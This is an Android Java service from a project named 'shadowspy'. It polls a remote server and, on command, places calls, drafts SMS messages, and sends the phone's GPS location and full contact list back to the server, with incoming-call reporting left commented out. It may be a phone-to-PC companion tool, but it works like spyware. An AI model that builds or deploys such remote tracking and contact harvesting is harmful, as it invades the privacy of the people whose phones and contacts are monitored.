package com.example.shadowspy;

import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import android.R.integer;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.app.Activity;
import android.content.ContentProvider;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.UriMatcher;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.Cursor;


public class NetService extends Service{
	private Timer updateTimer;
	private Post post;
	private String[] resArray;
	private String result;
	private String id;
	public static boolean isWorking = false;
	private SharedPreferences preference;
	private String hash;
	private boolean connectionState = false;
		

	//----------------------------------------------------------------
	@Override
	public IBinder onBind(Intent arg0) {
		//TODO
		return null;
	}
	
	
	//---------------------------------------------------------------
	@Override
	public int onStartCommand(Intent intent, int flags, int startid){
		post = new Post(getApplicationContext());
		
		//--------------------
		preference = getSharedPreferences(Codes.file_pref, MODE_PRIVATE);
		hash = preference.getString("hash", "00000000000000000000");
		int timeForRefresh = preference.getInt(Codes.saved_time_to_refresh, 17000);
		
		updateTimer = new Timer("updateTimer");
		updateTimer.scheduleAtFixedRate(Refresh, 0, timeForRefresh);
		
		/*
		//---------------------
		//Приймач вхідних дзвінків
		TelManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		PhoneStateListener callListener = new PhoneStateListener(){
			public void onCallStateChanged(final int state, final String incomingNumber){
				new Thread(new Runnable() {
				    public void run() {
				    	String msg;
						if(state == 1)
							msg = Codes.START_INCOMING_CALL + "#" + incomingNumber;	
						else
							msg = Codes.STOP_INCOMING_CALL + "#" + incomingNumber;	
						String result = post.SendMessage(msg);
						
						Log.v("incomingCall", result);
				    }//run()
				    
				}).start();		

			}
		};
		TelManager.listen(callListener, PhoneStateListener.LISTEN_CALL_STATE);
		//---------------------*/
	
		
		return Service.START_NOT_STICKY;
	}
	
	
	//-----------------------------------------------------------------
    protected void onPostExecute(Void result) { 
      stopSelf();
    }
	
	
	//-----------------------------------------------------------------
	@Override
	public void onCreate(){
		isWorking = true;
		Post post = new Post(getApplicationContext());
		updateTimer = new Timer("updateTimer");
	}
	
	
	//-------------------------------------------------------------------
	@Override
	public void onDestroy(){
		updateTimer.cancel();
		isWorking = false;
		Editor editor = preference.edit();
		editor.putString("hash", hash);
		editor.commit();
		stopSelf();
		super.onDestroy();
	}
	
	
	//-------------------------------------------------------------------
	private TimerTask Refresh = new TimerTask(){
		public void run() {
			result = post.RefreshMSG();
			if (result.equals("")) result = "#0#0#0#0";
			Log.w("Server1","Server: " + result);
			resArray = post.processMSG(result);	
			Log.w("qqq",result);
			id = resArray[2];
			Log.w("qqq","b");
			if(!hash.equals(resArray[1])){
				//TODO
				if(id.equals(Codes.FAIL_SEND_MESSAGE)){
					NotifyUtils notify = new NotifyUtils(getApplicationContext(), MenuList.class);
					notify.ShowNotification(Codes.CONNECTION_NOTIFY,
											"PC offline", 
											"Очікуйте приєднання клієнта", 
											R.drawable.no_connection_small,
											false);	
					connectionState = true;
				}else if(connectionState){
					NotifyUtils notify = new NotifyUtils(getApplicationContext(), MenuList.class);
					notify.ShowNotification(Codes.CONNECTION_NOTIFY,
											"З'єднання з сервером встановлено", 
											"PC online",  
											R.drawable.connection_success_small,
											false);	
					connectionState = false;					
					
				}
				
				
				if(id.equals(Codes.NEW_CALL)){
					String number = resArray[3].substring(1);
					NewCall(number);
				}
				if(id.equals(Codes.NEW_SMS)){
					String number = resArray[3].substring(1);
					String text = resArray[4].substring(1);
					text = Decode(text);
					SendNewSMS(number, text);	
				}
				if(id.equals(Codes.MY_LOCATION)){
			    	Random rand = new Random();
			    	int r = rand.nextInt();
					String position = GetMyLocation();
					post.SendMessage(Codes.MY_LOCATION+position+"#"+Integer.toString(r));
					Log.v("location", position);
				}
				if(id.equals(Codes.NEW_MSG)){
					
					String stickerText = resArray[3].substring(1);
					Log.v("mPart",  "text1=" + stickerText); 
					stickerText = Decode(stickerText);
					Log.v("mPart",  "text2=" + stickerText); 
					ShowSticker(stickerText);
				}
				if(id.equals(Codes.GET_CONTACT_LIST)){
					Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER}, null, null, null);
					String data = "";
					if (cursor.getCount() > 0)
					{
					    while (cursor.moveToNext())
					    {
					    	data += "#" + cursor.getString(1) + ":" + cursor.getString(2); 
					    }
					    final String text = data;
					    new Thread(new Runnable() {
						    public void run() {			
						    	post.SendMessage(Codes.GET_CONTACT_LIST + text);
						    }//run() 
						}).start();		
					}
					
				}
				hash = resArray[1];
			}

		};//run()
		
	};//Refresh
	
	
	//------------------------------------------------------------------
	
	
	//-------------------------------------------------------------------
	//Отримує місце знаходження телефону
	//TODO
	private String GetMyLocation(){
		LocationManager locationmanager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		Location location = locationmanager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		String result;
		if(location != null){
			double lat = location.getLatitude();
			double lng = location.getLongitude();
			result = "#" + lat + "#" + lng;
		}
		else
			result = "#0#0";
		return result;
	}
	
	
	//------------------------------------------------------------------
	//Новий дзвінок
	private void NewCall(String number){
		Intent call = new Intent(Intent.ACTION_CALL, Uri.parse("tel:"+number));
		call.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(call);
	}
	
	
	//------------------------------------------------------------------
	//Створює нове вихідне повідомлення
	private void SendNewSMS(String number, String text){
		Uri smsUri = Uri.parse("sms:" + number);
		Intent sms = new Intent(Intent.ACTION_VIEW, smsUri);
		sms.putExtra("sms_body", text);
		sms.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(sms);
	}

	//------------------------------------------------------------------
	//оброблює вхідне текстове повідомлення від ПК
	private void ShowSticker(String text){
		NotifyUtils notify = new NotifyUtils(getApplicationContext(), ShowStickerActivity.class);
		notify.NotifyIntentPutExtra("sticker_text", text);
		notify.ShowNotification(Codes.NEW_MESSAGE_NOTIFY,
								"Отримано нове повідомлення", 
								text, 
								R.drawable.new_mail,
								true);	
		
		
		Intent sticker = new Intent(this, ShowStickerActivity.class);
		sticker.putExtra("sticker_text", text);
		sticker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(sticker);
	}


	//--------------------------------------------------------------------
	//декодер кирилиці
    private String Decode(String src)
    {
        String alpha = "абвгдеєжзиіїйклмнопрстуфхцчшщьюяёъыАБВГДЕЄЖЗИІЇЙКЛЬНОПРСТУФХЧШЩЬЮЯЁЪЫ";
        boolean isCyrilic = false; String pos = "";
        String result = "";
        for (int i = 0; i < src.length(); i++)
        {
            if ( (src.charAt(i) == '?') && 
                src.charAt(i+1) > 47 && src.charAt(i+1) < 58 && 
                src.charAt(i+2)  > 47 && src.charAt(i+2)  < 58)
            {
                isCyrilic = true;
                pos = "";
                continue;
            }
            if (isCyrilic)
            {
                pos += src.charAt(i);
                pos += src.charAt(i+1) ;
                
                result += alpha.charAt(Integer.parseInt(pos)); 
                i++;
                isCyrilic = false;
            }
            else result += src.charAt(i);
        }

        return result;
    }

}
